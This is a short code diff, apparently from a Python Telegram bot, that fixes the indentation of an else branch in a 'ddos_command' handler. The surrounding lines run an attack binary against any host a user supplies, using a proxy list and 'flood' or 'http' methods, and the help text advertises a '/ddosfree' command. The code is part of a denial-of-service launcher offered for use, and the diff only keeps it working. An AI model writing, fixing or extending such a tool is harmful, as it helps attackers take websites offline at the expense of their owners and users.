@@ -220,7 +220,7 @@ def ddos_command(message):
         command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-hetb", "-safe"]
     elif method == "flood":
         command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-heta", "-safe"]
-        else:
+    else:
         bot.reply_to(message, 'Method erron\nMethod Start Attack\nflood\nhttp\nHow to run /ddosfree <Method> <url>')
         return
 
